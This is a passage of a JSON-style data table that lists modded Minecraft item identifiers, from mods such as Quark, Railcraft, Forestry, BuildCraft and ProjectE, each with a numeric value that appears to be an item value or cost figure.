  ""quark:charred_nether_bricks|0"": 114,
  ""quark:red_sandstone_bricks_stairs|0"": 3,
  ""quark:iron_plate|0"": 89,
  ""quark:iron_plate|1"": 85,
  ""quark:stained_planks_brown_stairs|0"": 6,
  ""blockcraftery:editable_inner_corner|0"": 6,
  ""quark:limestone|0"": 1,
  ""quark:limestone|1"": 1,
  ""projecte:interdiction_torch|0"": 25864,
  ""projectred-exploration:peridot_pickaxe|0"": 3080,
  ""forestry:leaves.decorative.2|0"": 1,
  ""forestry:leaves.decorative.2|1"": 1,
  ""minecraft:stone_axe|0"": 11,
  ""forestry:leaves.decorative.2|2"": 1,
  ""irontanks:silver_tank|0"": 1812,
  ""extratrees:stairs.hazel|0"": 6,
  ""extratrees:fence.gates.hazel|0"": 32,
  ""minecraft:cactus|0"": 8,
  ""minecraft:fence_gate|0"": 32,
  ""railcraft:ingot|9"": 153,
  ""railcraft:ingot|8"": 256,
  ""blockcraftery:editable_slab|0"": 8,
  ""minecraft:emerald|0"": 16384,
  ""quark:stained_planks_pink_slab|0"": 4,
  ""railcraft:ingot|3"": 512,
  ""railcraft:ingot|2"": 256,
  ""railcraft:ingot|1"": 128,
  ""railcraft:ingot|7"": 512,
  ""railcraft:ingot|6"": 1024,
  ""railcraft:ingot|5"": 160,
  ""railcraft:ingot|4"": 512,
  ""chisel:marble2|7"": 4,
  ""ironchest:iron_gold_shulker_upgrade|0"": 16640,
  ""railcraft:frostbound|4"": 136,
  ""railcraft:frostbound|5"": 112,
  ""railcraft:frostbound|0"": 112,
  ""railcraft:frostbound|1"": 112,
  ""railcraft:frostbound|2"": 112,
  ""railcraft:frostbound|3"": 112,
  ""quark:prismarine_bricks_stairs|0"": 1728,
  ""quark:biome_brick|1"": 64,
  ""projecte:rm_furnace|0"": 10059784,
  ""quark:biome_brick|0"": 64,
  ""minecraft:carpet|0"": 32,
  ""minecraft:carpet|1"": 33,
  ""minecraft:carpet|2"": 33,
  ""minecraft:carpet|3"": 33,
  ""minecraft:carpet|4"": 33,
  ""minecraft:carpet|5"": 34,
  ""quark:magma_bricks_slab|0"": 32,
  ""minecraft:carpet|6"": 33,
  ""minecraft:carpet|7"": 34,
  ""minecraft:carpet|8"": 33,
  ""minecraft:carpet|9"": 68,
  ""minecraft:carpet|10"": 68,
  ""minecraft:carpet|11"": 104,
  ""minecraft:wooden_sword|0"": 20,
  ""minecraft:carpet|12"": 42,
  ""minecraft:carpet|13"": 32,
  ""minecraft:carpet|14"": 33,
  ""minecraft:carpet|15"": 33,
  ""minecraft:cooked_fish|0"": 64,
  ""minecraft:cooked_fish|1"": 64,
  ""minecraft:stone_slab2|0"": 2,
  ""quark:stained_planks_orange_stairs|0"": 6,
  ""minecraft:rabbit|0"": 64,
  ""quark:colored_flowerpot_lime|0"": 76,
  ""mocreatures:wyvwood_sapling|0"": 32,
  ""minecraft:cooked_porkchop|0"": 64,
  ""blockcraftery:editable_outer_corner_reinforced|0"": 8,
  ""blockcraftery:editable_slant_reinforced|0"": 16,
  ""blockcraftery:editable_wall_reinforced|0"": 33,
  ""minecraft:jungle_door|0"": 16,
  ""minecraft:bucket|0"": 768,
  ""quark:cobblestone_mossy_stairs|0"": 6,
  ""forestry:doors.cocobolo|0"": 16,
  ""quark:purpur_block_wall|0"": 192,
  ""minecraft:writable_book|0"": 224,
  ""extratrees:fence.gates.ash|0"": 32,
  ""quark:bark_dark_oak_stairs|0"": 24,
  ""galacticraftcore:space_glass_vanilla|0"": 205,
  ""extratrees:fences.0|1"": 13,
  ""extratrees:fences.1|2"": 13,
  ""extratrees:fences.2|3"": 13,
  ""extratrees:fences.1|3"": 13,
  ""extratrees:fences.0|0"": 13,
  ""extratrees:fences.2|2"": 13,
  ""extratrees:fences.2|1"": 13,
  ""extratrees:fences.0|3"": 13,
  ""extratrees:fences.1|0"": 13,
  ""extratrees:fences.0|2"": 13,
  ""extratrees:fences.1|1"": 13,
  ""extratrees:fences.2|0"": 13,
  ""extratrees:fences.0|5"": 13,
  ""extratrees:fences.1|6"": 13,
  ""extratrees:fences.0|4"": 13,
  ""extratrees:fences.1|7"": 13,
  ""extratrees:fences.1|4"": 13,
  ""extratrees:fences.0|7"": 13,
  ""extratrees:fences.0|6"": 13,
  ""extratrees:fences.1|5"": 13,
  ""extratrees:fences.0|9"": 13,
  ""extratrees:fences.1|10"": 13,
  ""extratrees:fences.0|8"": 13,
  ""extratrees:fences.1|11"": 13,
  ""chisel:bookshelf_spruce|0"": 504,
  ""extratrees:fences.0|11"": 13,
  ""extratrees:fences.1|8"": 13,
  ""extratrees:fences.1|9"": 13,
  ""extratrees:fences.0|10"": 13,
  ""extratrees:fences.0|13"": 13,
  ""extratrees:fences.1|14"": 13,
  ""extratrees:fences.0|12"": 13,
  ""extratrees:fences.1|15"": 13,
  ""extratrees:fences.0|15"": 13,
  ""extratrees:fences.1|12"": 13,
  ""extratrees:fences.0|14"": 13,
  ""extratrees:fences.1|13"": 13,
  ""forestry:doors.cherry|0"": 16,
  ""railcraft:brick_abyssal|5"": 32,
  ""quark:stained_planks_white_stairs|0"": 6,
  ""minecraft:clay|0"": 64,
  ""quark:duskbound_block_stairs|0"": 75,
  ""projectred-exploration:peridot_shovel|0"": 1032,
  ""chisel:cloud|0"": 6,
  ""minecraft:yellow_glazed_terracotta|0"": 64,
  ""extratrees:stairs.banana|0"": 6,
  ""forestry:stairs.maple|0"": 6,
  ""extratrees:stairs.maclura|0"": 6,
  ""forestry:fence.gates.larch|0"": 32,
  ""minecraft:cooked_chicken|0"": 64,
  ""buildcrafttransport:pipe_wood_power|6"": 66,
  ""buildcrafttransport:pipe_wood_power|7"": 66,
  ""buildcrafttransport:pipe_wood_power|4"": 66,
  ""minecraft:birch_door|0"": 16,
  ""buildcrafttransport:pipe_wood_power|5"": 66,
  ""galacticraftplanets:mars|4"": 4,
  ""buildcrafttransport:pipe_wood_power|2"": 66,
  ""galacticraftplanets:mars|5"": 4,
  ""buildcrafttransport:pipe_wood_power|3"": 66,
  ""galacticraftplanets:mars|6"": 4,
  ""buildcrafttransport:pipe_wood_power|1"": 66,
  ""buildcrafttransport:pipe_wood_power|14"": 66,
  ""galacticraftplanets:mars|9"": 4,
  ""buildcrafttransport:pipe_wood_power|15"": 66,
  ""forestry:doors.pine|0"": 16,
  ""buildcrafttransport:pipe_wood_power|12"": 66,
  ""buildcrafttransport:pipe_wood_power|13"": 66,
  ""buildcrafttransport:pipe_wood_power|10"": 66,
  ""buildcrafttransport:pipe_wood_power|11"": 66,
  ""buildcrafttransport:pipe_wood_power|8"": 66,
  ""buildcrafttransport:pipe_wood_power|9"": 66,
  ""buildcrafttransport:pipe_wood_power|16"": 66,
  ""mocreatures:wyvstone_wall|0"": 1,
  ""minecraft:golden_shovel|0"": 2056,
  ""minecraft:golden_apple|0"": 16512,
  ""minecraft:golden_apple|1"": 147584,
  ""minecraft:end_rod|0"": 432,
  ""blockcraftery:editable_pressure_plate_items_reinforced|0"": 41,
  ""buildcrafttransport:pipe_daizuli_item|7"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|6"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|5"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|4"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|3"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|2"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|1"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|15"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|14"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|13"": 1996,
  ""quark:dark_oak_pressure_plate|0"": 16,
  ""minecraft:golden_boots|0"": 8192,
  ""buildcrafttransport:pipe_daizuli_item|12"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|11"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|10"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|9"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|8"": 1996,
  ""galacticraftcore:glowstone_torch|0"": 97,
  ""buildcrafttransport:pipe_daizuli_item|16"": 1996,
  ""quark:quilted_wool|11"": 164,
  ""quark:midori_block_wall|0"": 8,
  ""quark:quilted_wool|10"": 111,
  ""minecraft:brick_block|0"": 64,
  ""quark:quilted_wool|9"": 110,
  ""quark:quilted_wool|8"": 58,
  ""quark:quilted_wool|15"": 58,
  ""quark:quilted_wool|14"": 58,
  ""quark:quilted_wool|13"": 57,
  ""quark:quilted_wool|12"": 72,
  ""quark:quilted_wool|3"": 58,
  ""quark:quilted_wool|2"": 58,
  ""quark:quilted_wool|1"": 58,
  ""quark:quilted_wool|0"": 56,
  ""quark:quilted_wool|7"": 60,
  ""quark:quilted_wool|6"": 58,
  ""quark:quilted_wool|5"": 59,
  ""quark:quilted_wool|4"": 58,
  ""quark:stone_andesite_bricks_slab|0"": 8,
  ""minecraft:record_wait|0"": 2048,
  ""buildcrafttransport:pipe_clay_item|16"": 16,
  ""projectred-exploration:stone|0"": 1,
  ""buildcrafttransport:pipe_clay_item|6"": 16,
  ""projectred-exploration:stone|1"": 1,
  ""buildcrafttransport:pipe_clay_item|7"": 16,
  ""projectred-exploration:stone|2"": 1,
  ""buildcrafttransport:pipe_clay_item|4"": 16,
  ""minecraft:glass|0"": 1,
  ""projectred-exploration:stone|3"": 1,
  ""buildcrafttransport:pipe_clay_item|5"": 16,
  ""projectred-exploration:stone|4"": 1,
  ""buildcrafttransport:pipe_clay_item|2"": 16,
  ""projectred-exploration:stone|5"": 9216,
  ""buildcrafttransport:pipe_clay_item|3"": 16,
  ""projectred-exploration:stone|6"": 9216,
  ""projectred-exploration:stone|7"": 9216,
  ""buildcrafttransport:pipe_clay_item|1"": 16,
  ""buildcrafttransport:pipe_clay_item|14"": 16,
  ""galacticraftcore:wall_gc|2"": 2,
  ""buildcrafttransport:pipe_clay_item|15"": 16,
  ""buildcrafttransport:pipe_clay_item|12"": 16,
  ""quark:stone_andesite_bricks_stairs|0"": 12,
  ""projectred-exploration:stone|11"": 1152,
  ""buildcrafttransport:pipe_clay_item|13"": 16,
  ""buildcrafttransport:pipe_clay_item|10"": 16,
  ""buildcrafttransport:pipe_clay_item|11"": 16,
  ""buildcrafttransport:pipe_clay_item|8"": 16,
  ""galacticraftcore:wall_gc|4"": 4,
  ""buildcrafttransport:pipe_clay_item|9"": 16,
  ""minecraft:stick|0"": 4,
  ""quark:bark_dark_oak_wall|0"": 32,
  ""minecraft:speckled_melon|0"": 1832,
  ""extratrees:fence.gates.gingko|0"": 32,
  ""minecraft:iron_trapdoor|0"": 1024,
  ""extratrees:fence.gates.logwood|0"": 32,
  ""extratrees:stairs.sweetgum|0"": 6,
  ""minecraft:spruce_fence|0"": 13,
  ""quark:soul_sandstone|2"": 196,
  ""quark:soul_sandstone|1"": 196,
  ""quark:soul_sandstone|0"": 196,
  ""mocreatures:mossy_cobbled_wyvstone_wall|0"": 2,
  ""chisel:glassdyedlime|1"": 1,
  ""chisel:glassdyedlime|0"": 1,
  ""chisel:glassdyedlime|3"": 1,
  ""chisel:glassdyedlime|2"": 1,
  ""chisel:glassdyedlime|5"": 1,
  ""chisel:glassdyedlime|4"": 1,
  ""quark:birch_pressure_plate|0"": 16,
  ""quark:icy_stone_brick_stairs|0"": 48,
  ""extratrees:doors.maclura|0"": 16,
  ""forestry:fence.gates.balsa|0"": 32,
  ""extratrees:doors.purpleheart|0"": 16,
  ""forestry:ingot_tin|0"": 256,
  ""railcraft:infernal_slab|1"": 26,
  ""railcraft:infernal_slab|0"": 26,
  ""minecraft:dropper|0"": 71,
  ""minecraft:chest|0"": 64,
  ""minecraft:cauldron|0"": 1792,
  ""quark:dark_oak_button|0"": 8,
  ""forestry:fence.gates.sequoia|0"": 32,
  ""forestry:doors.walnut|0"": 16,
  ""quark:framed_glass|0"": 257,
  ""chisel:glassdyedblue|2"": 1,
  ""chisel:glassdyedblue|3"": 1,
  ""chisel:glassdyedblue|0"": 1,
  ""chisel:glassdyedblue|1"": 1,
  ""chisel:glassdyedblue|4"": 1,
  ""chisel:glassdyedblue|5"": 1,
  ""quark:colored_flowerpot_white|0"": 96,
  ""quark:prismarine_stairs|0"": 768,
  ""cathedral:basalt_slab_checkered|0"": 1,
  ""quark:prismarine_bricks_slab|0"": 1152,
  ""minecraft:record_ward|0"": 2048,
  ""forestry:fence.gates.cherry|0"": 32,
  ""minecraft:diamond_helmet|0"": 40960,
  ""quark:stained_planks_orange_slab|0"": 4,
  ""railcraft:infernal_paver_stairs|0"": 39,
  ""minecraft:diamond_leggings|0"": 57344,
  ""minecraft:cookie|0"": 22,
  ""forestry:stairs.citrus|0"": 6,
  ""forestry:doors.palm|0"": 16,
  ""quark:iron_button|0"": 264,
  ""projectred-exploration:stone_wall|1"": 1,
  ""projectred-exploration:stone_wall|0"": 1,
  ""projectred-exploration:stone_wall|3"": 1,
  ""cathedral:cathedral_gargoyle_demon_stone|0"": 253,
  ""projectred-exploration:stone_wall|2"": 1,
  ""projectred-exploration:stone_wall|5"": 9216,
  ""projectred-exploration:stone_wall|4"": 1,
  ""projectred-exploration:stone_wall|7"": 9216,
  ""projectred-exploration:stone_wall|6"": 9216,
  ""projectred-exploration:stone_wall|9"": 2304,
  ""projectred-exploration:stone_wall|8"": 1152,
  ""projectred-exploration:stone_wall|11"": 1152,
  ""projectred-exploration:stone_wall|10"": 4608,
  ""minecraft:hay_block|0"": 216,
  ""quark:arrow_torch|0"": 23,
  ""minecraft:jukebox|0"": 8256,
  ""railcraft:andesite|4"": 40,
  ""railcraft:andesite|5"": 16,
  ""minecraft:ice|0"": 1,
  ""railcraft:andesite|3"": 16,
  ""railcraft:andesite|0"": 16,
  ""railcraft:andesite|1"": 16,
  ""quark:stained_planks_lime_slab|0"": 4,
  ""cathedral:cathedral_gargoyle_demon_obsidian|0"": 505,
  ""minecraft:birch_fence_gate|0"": 32,
  ""quark:colored_item_frame|10"": 536,
  ""quark:colored_item_frame|11"": 960,
  ""quark:colored_item_frame|8"": 112,
  ""quark:colored_item_frame|9"": 532,
  ""quark:colored_item_frame|14"": 112,
  ""quark:colored_item_frame|15"": 112,
  ""buildcrafttransport:pipe_sandstone_item|16"": 1,
  ""quark:colored_item_frame|12"": 224,
  ""quark:colored_item_frame|13"": 104,
  ""quark:colored_item_frame|2"": 112,
  ""quark:colored_item_frame|3"": 112,
  ""quark:colored_item_frame|0"": 144,
  ""quark:colored_item_frame|1"": 112,
  ""quark:colored_item_frame|6"": 112,
  ""quark:colored_item_frame|7"": 128,
  ""quark:colored_item_frame|4"": 112,
  ""quark:colored_item_frame|5"": 124,
  ""chisel:planks-birch|14"": 8,
  ""buildcrafttransport:pipe_sandstone_item|5"": 1,
  ""buildcrafttransport:pipe_sandstone_item|4"": 1,
  ""chisel:planks-birch|12"": 8,
  ""buildcrafttransport:pipe_sandstone_item|7"": 1,
  ""chisel:planks-birch|13"": 8,
  ""buildcrafttransport:pipe_sandstone_item|6"": 1,
  ""chisel:planks-birch|10"": 8,
  ""buildcrafttransport:pipe_sandstone_item|1"": 1,
  ""chisel:planks-birch|11"": 8,
  ""chisel:planks-birch|8"": 8,
  ""buildcrafttransport:pipe_sandstone_item|3"": 1,
  ""chisel:planks-birch|9"": 8,
  ""buildcrafttransport:pipe_sandstone_item|2"": 1,
  ""chisel:planks-birch|6"": 8,
  ""buildcrafttransport:pipe_sandstone_item|13"": 1,
  ""chisel:planks-birch|7"": 8,
  ""buildcrafttransport:pipe_sandstone_item|12"": 1,
  ""chisel:planks-birch|4"": 8,
  ""projectred-exploration:ruby_sword|0"": 2052,
  ""buildcrafttransport:pipe_sandstone_item|15"": 1,
  ""chisel:planks-birch|5"": 8,
  ""buildcrafttransport:pipe_sandstone_item|14"": 1,
  ""chisel:planks-birch|2"": 8,
  ""buildcrafttransport:pipe_sandstone_item|9"": 1,
  ""chisel:planks-birch|3"": 8,
  ""quark:magma_bricks|0"": 64,
  ""buildcrafttransport:pipe_sandstone_item|8"": 1,
  ""chisel:planks-birch|0"": 8,
  ""buildcrafttransport:pipe_sandstone_item|11"": 1,
  ""chisel:planks-birch|1"": 8,
  ""buildcrafttransport:pipe_sandstone_item|10"": 1,
  ""railcraft:nugget|3"": 56,
  ""railcraft:nugget|2"": 28,
  ""railcraft:nugget|1"": 14,
  ""railcraft:nugget|7"": 56,
  ""railcraft:nugget|6"": 113,
  ""ironchest:diamond_crystal_shulker_upgrade|0"": 72,
  ""railcraft:nugget|4"": 56,
  ""railcraft:nugget|9"": 17,
  ""railcraft:nugget|8"": 28,
  ""quark:colored_flowerpot_gray|0"": 80,
  ""blockcraftery:editable_fence_reinforced|0"": 23,
  ""minecraft:ender_pearl|0"": 1024,
  ""railcraft:red_nether|5"": 50,
  ""railcraft:red_nether|4"": 74,
  ""quark:snow_bricks_wall|0"": 1,
  ""quark:icy_stone_brick_slab|0"": 32,
  ""railcraft:red_nether|1"": 50,
  ""railcraft:red_nether|3"": 50,
  ""railcraft:red_nether|2"": 50,
  ""forestry:stairs.walnut|0"": 6,
  ""forestry:doors.giganteum|0"": 16,
  ""forestry:doors.mahogany|0"": 16,
  ""forestry:fence.gates.zebrawood|0"": 32,
  ""forestry:fence.gates.kapok|0"": 32,
  ""irontanks:copper_silver_upgrade|0"": 2177,
  ""minecraft:record_strad|0"": 2048,
  ""quark:roots_black_flower|0"": 24,
  ""chisel:futura|0"": 9,
  ""microblockcbe:saw_iron|0"": 270,
  ""minecraft:red_glazed_terracotta|0"": 64,
  ""quark:stained_clay_tiles_purple_slab|0"": 32,
  ""botany:misc_ceramic|0"": 11,
  ""projectred-exploration:sapphire_hoe|0"": 2056,
  ""minecraft:log2|1"": 32,
  ""minecraft:log2|0"": 32,
  ""extratrees:stairs.brazilwood|0"": 6,
  ""minecraft:pumpkin_pie|0"": 208,
  ""minecraft:quartz_stairs|0"": 768,
  ""railcraft:bloodstained_slab|0"": 18,
  ""quark:carved_wood|2"": 8,
  ""railcraft:bloodstained_slab|1"": 18,
  ""cathedral:cathedral_pillar_various|1"": 3,
  ""quark:carved_wood|3"": 8,
  ""quark:carved_wood|0"": 8,
  ""cathedral:cathedral_pillar_various|2"": 3,
  ""cathedral:cathedral_pillar_various|3"": 48,
  ""quark:carved_wood|1"": 8,
  ""cathedral:cathedral_pillar_various|4"": 3,
  ""cathedral:cathedral_gargoyle_demon_snow|0"": 253,
  ""cathedral:cathedral_pillar_various|5"": 768,
  ""quark:carved_wood|4"": 8,
  ""cathedral:cathedral_pillar_various|7"": 3,
  ""quark:carved_wood|5"": 8,
  ""cathedral:cathedral_pillar_various|9"": 3,
  ""cathedral:cathedral_pane_stained|0"": 23,
  ""cathedral:cathedral_pane_stained|1"": 23,
  ""forestry:doors.teak|0"": 16,
  ""ic2:leaves|0"": 1,
  ""quark:stained_planks_blue_slab|0"": 4,
  ""minecraft:spruce_stairs|0"": 6,
  ""quark:fire_stone_wall|0"": 64,
  ""minecraft:nether_wart_block|0"": 216,
  ""quark:colored_flowerpot_black|0"": 64,
  ""buildcraftcore:list|0"": 296,
  ""quark:thatch_slab|0"": 48,
  ""extratrees:stairs.locust|0"": 6,
  ""railcraft:bloodstained_paver_stairs|0"": 27,
  ""quark:world_stone_bricks|5"": 1,
  ""quark:acacia_button|0"": 8,
  ""quark:world_stone_bricks|0"": 16,
  ""quark:world_stone_bricks|1"": 16,
  ""quark:world_stone_bricks|2"": 16,
  ""minecraft:chorus_fruit|0"": 192,
  ""quark:bark_jungle_slab|0"": 16,
  ""extratrees:slabs.0|5"": 4,
  ""extratrees:slabs.1|4"": 4,
  ""extratrees:slabs.0|4"": 4,
  ""extratrees:slabs.1|5"": 4,
  ""extratrees:slabs.0|7"": 4,
  ""extratrees:slabs.1|6"": 4,
  ""extratrees:slabs.0|6"": 4,
  ""extratrees:slabs.1|7"": 4,
  ""extratrees:slabs.0|1"": 4,
  ""extratrees:slabs.1|0"": 4,
  ""extratrees:slabs.0|0"": 4,
  ""extratrees:slabs.1|1"": 4,
  ""extratrees:slabs.0|3"": 4,
  ""extratrees:slabs.1|2"": 4,
  ""extratrees:slabs.0|2"": 4,
  ""extratrees:slabs.1|3"": 4,
  ""extratrees:slabs.2|3"": 4,
  ""extratrees:slabs.4|1"": 4,
  ""extratrees:slabs.3|2"": 4,
  ""extratrees:slabs.4|0"": 4,
  ""extratrees:slabs.2|2"": 4,
  ""extratrees:slabs.3|3"": 4,
  ""forestry:doors.ebony|0"": 16,
  ""extratrees:slabs.2|1"": 4,
  ""extratrees:slabs.4|3"": 4,
  ""extratrees:slabs.3|0"": 4,
  ""extratrees:slabs.4|2"": 4,
  ""extratrees:slabs.2|0"": 4,
  ""extratrees:slabs.3|1"": 4,
  ""extratrees:slabs.2|7"": 4,
  ""extratrees:slabs.3|6"": 4,
  ""extratrees:slabs.2|6"": 4,
  ""extratrees:slabs.3|7"": 4,
  ""extratrees:slabs.2|5"": 4,
  ""extratrees:slabs.3|4"": 4,
  ""extratrees:slabs.2|4"": 4,
  ""extratrees:slabs.3|5"": 4,
  ""quark:birch_button|0"": 8,
  ""projectred-exploration:peridot_sword|0"": 2052,
  ""extratrees:fence.gates.rowan|0"": 32,
  ""minecraft:iron_leggings|0"": 1792,
  ""quark:thatch_stairs|0"": 72,
  ""minecraft:golden_hoe|0"": 4104,
  ""projecte:matter_block|1"": 1867776,
  ""projecte:matter_block|0"": 557056,
  ""extratrees:logs.0|0"": 32,
  ""extratrees:logs.1|1"": 32,
  ""extratrees:logs.0|1"": 32,
  ""extratrees:logs.1|0"": 32,
  ""extratrees:logs.0|2"": 32,
  ""extratrees:logs.1|3"": 32,
  ""chisel:brownstone|0"": 8,
  ""extratrees:logs.0|3"": 32,
  ""extratrees:logs.1|2"": 32,
  ""quark:stone_andesite_slab|0"": 8,
  ""extratrees:logs.2|2"": 32,
  ""extratrees:logs.3|3"": 32,
  ""extratrees:logs.4|0"": 32,
  ""extratrees:logs.5|1"": 32,
  ""extratrees:logs.2|3"": 32,
  ""extratrees:logs.3|2"": 32,
  ""extratrees:logs.4|1"": 32,
  ""extratrees:logs.5|0"": 32,
  ""extratrees:logs.2|0"": 32,
  ""extratrees:logs.3|1"": 32,
  ""extratrees:logs.4|2"": 32,
  ""extratrees:logs.5|3"": 32,
  ""ironchest:diamond_obsidian_chest_upgrade|0"": 513,
  ""extratrees:logs.2|1"": 32,
  ""extratrees:logs.3|0"": 32,
  ""extratrees:logs.4|3"": 32,
  ""extratrees:logs.5|2"": 32,
  ""extratrees:logs.6|2"": 32,
  ""extratrees:logs.7|3"": 32,
  ""extratrees:logs.8|0"": 32,
  ""extratrees:logs.9|1"": 32,
  ""forestry:doors.wenge|0"": 16,
  ""extratrees:logs.6|3"": 32,
  ""extratrees:logs.7|2"": 32,
  ""extratrees:logs.8|1"": 32,
  ""extratrees:logs.9|0"": 32,
  ""extratrees:logs.6|0"": 32,
  ""extratrees:logs.7|1"": 32,
  ""extratrees:logs.8|2"": 32,
  ""extratrees:logs.9|3"": 32,
  ""extratrees:logs.6|1"": 32,
  ""extratrees:logs.7|0"": 32,
  ""extratrees:logs.8|3"": 32,
  ""extratrees:logs.9|2"": 32,
  ""microblockcbe:stone_rod|0"": 2,
  ""quark:roots_blue_flower|0"": 24,
  ""quark:stone_diorite_bricks_stairs|0"": 12,
  ""extratrees:doors.hawthorn|0"": 16,
  ""extratrees:doors.butternut|0"": 16,
  ""minecraft:silver_glazed_terracotta|0"": 64,
  ""minecraft:record_mall|0"": 2048,
  ""minecraft:lever|0"": 5,
  ""blockcraftery:editable_trap_door|0"": 16,
  ""quark:acacia_pressure_plate|0"": 16,
  ""minecraft:chest_minecart|0"": 1344,
  ""buildcrafttransport:pipe_gold_power|16"": 576,
  ""minecraft:orange_glazed_terracotta|0"": 64,
  ""extratrees:fence.gates.hickory|0"": 32,
  ""forestry:stairs.cherry|0"": 6,
  ""buildcrafttransport:pipe_gold_power|8"": 576,
  ""buildcrafttransport:pipe_gold_power|9"": 576,
  ""buildcrafttransport:pipe_gold_power|10"": 576,
  ""buildcrafttransport:pipe_gold_power|11"": 576,
  ""buildcrafttransport:pipe_gold_power|12"": 576,
  ""buildcrafttransport:pipe_gold_power|13"": 576,
  ""buildcrafttransport:pipe_gold_power|14"": 576,
  ""buildcrafttransport:pipe_gold_power|15"": 576,
  ""minecraft:coal|0"": 128,
  ""minecraft:coal|1"": 32,
  ""buildcrafttransport:pipe_gold_power|1"": 576,
  ""buildcrafttransport:pipe_gold_power|2"": 576,
  ""buildcrafttransport:pipe_gold_power|3"": 576,
  ""buildcrafttransport:pipe_gold_power|4"": 576,
  ""buildcrafttransport:pipe_gold_power|5"": 576,
  ""buildcrafttransport:pipe_gold_power|6"": 576,
  ""buildcrafttransport:pipe_gold_power|7"": 576,
  ""quark:elder_prismarine_slab|0"": 64,
  ""minecraft:dirt|0"": 1,
  ""minecraft:dirt|1"": 2,
  ""galacticraftcore:basic_block_moon|4"": 2,
  ""minecraft:dirt|2"": 2,
  ""galacticraftcore:basic_block_moon|5"": 2,
  ""galacticraftcore:basic_block_moon|3"": 2,
  ""forestry:fence.gates.wenge|0"": 32,
  ""chiselsandbits:chisel_iron|0"": 260,
  ""minecraft:hardened_clay|0"": 64,
  ""minecraft:red_sandstone_stairs|0"": 3,
  ""minecraft:leaves2|1"": 1,
  ""minecraft:leaves2|0"": 1,
  ""extratrees:stairs.gingko|0"": 6,
  ""minecraft:jungle_boat|0"": 40,
  ""extratrees:stairs.holly|0"": 6,
  ""quark:reed_block_wall|0"": 288,
  ""minecraft:ladder|0"": 9,
  ""forestry:doors.greenheart|0"": 16,
  ""minecraft:lapis_block|0"": 7776,
  ""mocreatures:wyvgrass|0"": 1,
  ""extratrees:stairs.alder|0"": 6,
  ""forestry:doors.citrus|0"": 16,
  ""minecraft:golden_pickaxe|0"": 6152,
  ""forestry:doors.mahoe|0"": 16,
  ""minecraft:hopper_minecart|0"": 2624,
  ""minecraft:cyan_glazed_terracotta|0"": 64,
  ""quark:bark_spruce_stairs|0"": 24,
  ""galacticraftplanets:dense_ice|0"": 2,
  ""forestry:doors.chestnut|0"": 16,
  ""extratrees:stairs.iroko|0"": 6,
  ""extratrees:doors.hickory|0"": 16,
  ""ironchest:silver_gold_chest_upgrade|0"": 8708,
  ""quark:fire_stone_slab|0"": 32,
  ""extratrees:stairs.cedar|0"": 6,
  ""minecraft:record_stal|0"": 2048,
  ""forestry:doors.willow|0"": 16,
  ""chisel:bookshelf_birch|0"": 504,
  ""extratrees:fence.gates.hemlock|0"": 32,
  ""minecraft:egg|0"": 32,
  ""quark:colored_flowerpot_red|0"": 64,
  ""minecraft:gold_ingot|0"": 2048,
  ""minecraft:leather|0"": 64,
  ""quark:duskbound_block_wall|0"": 100,
  ""irontanks:silver_gold_upgrade|0"": 4609,
  ""quark:colored_flowerpot_light_blue|0"": 64,
  ""quark:stained_planks_green_slab|0"": 4,
  ""quark:stained_planks_silver_slab|0"": 4,
  ""quark:elder_prismarine_bricks_stairs|0"": 216,
  ""minecraft:end_crystal|0"": 5895,
  ""minecraft:ender_eye|0"": 1792,
  ""galacticraftcore:space_glass_clear|0"": 103,
  ""extratrees:stairs.hawthorn|0"": 6,
  ""quark:stained_planks_brown_slab|0"": 4,
  ""ironchest:silver_gold_shulker_upgrade|0"": 8708,
  ""mocreatures:wyvwood_fence|0"": 13,
  ""forestry:stairs.pine|0"": 6,
  ""minecraft:light_blue_glazed_terracotta|0"": 64,
  ""quark:stained_clay_tiles_orange_slab|0"": 32,
  ""minecraft:chorus_flower|0"": 96,
  ""minecraft:acacia_fence|0"": 13,
  ""forestry:fence.gates.ebony|0"": 32,
  ""minecraft:chorus_fruit_popped|0"": 192,
  ""minecraft:gunpowder|0"": 192,
  ""forestry:stairs.sequoia|0"": 6,
  ""forestry:logs.0|1"": 32,
  ""forestry:logs.0|0"": 32,
  ""forestry:logs.0|3"": 32,
  ""forestry:logs.0|2"": 32,
  ""forestry:logs.1|2"": 32,
  ""forestry:logs.2|3"": 32,
  ""forestry:logs.3|0"": 32,
  ""forestry:logs.4|1"": 32,
  ""forestry:logs.1|3"": 32,
  ""forestry:logs.2|2"": 32,
  ""forestry:logs.3|1"": 32,
  ""forestry:logs.4|0"": 32,
  ""forestry:logs.1|0"": 32,
  ""forestry:logs.2|1"": 32,
  ""forestry:logs.3|2"": 32,
  ""forestry:logs.4|3"": 32,
  ""forestry:logs.1|1"": 32,
  ""forestry:logs.2|0"": 32,
  ""forestry:logs.3|3"": 32,
  ""forestry:logs.4|2"": 32,
  ""forestry:logs.5|2"": 32,
  ""forestry:logs.6|3"": 32,
  ""forestry:logs.7|0"": 32,
  ""forestry:logs.5|3"": 32,
  ""forestry:logs.6|2"": 32,
  ""forestry:logs.5|0"": 32,
  ""forestry:logs.6|1"": 32,
  ""quark:bark_birch_slab|0"": 16,
  ""forestry:logs.5|1"": 32,
  ""forestry:logs.6|0"": 32,
  ""quark:glass_item_frame|0"": 49,
  ""quark:stained_planks_gray_stairs|0"": 6,
  ""forestry:stairs.padauk|0"": 6,
  ""extratrees:stairs.rosewood|0"": 6,
  ""irontanks:glass_iron_upgrade|0"": 1025,
  ""forestry:doors.zebrawood|0"": 16,
  ""chisel:stonebrick1|0"": 1,
  ""chisel:stonebrick2|3"": 1,
  ""chisel:stonebrick1|1"": 1,
  ""chisel:stonebrick2|2"": 1,
  ""chisel:stonebrick1|2"": 1,
  ""chisel:stonebrick2|1"": 1,
  ""chisel:stonebrick1|3"": 1,
  ""chisel:stonebrick2|0"": 1,
  ""chisel:stonebrick1|4"": 1,
  ""chisel:stonebrick2|7"": 1,
  ""chisel:stonebrick1|5"": 1,
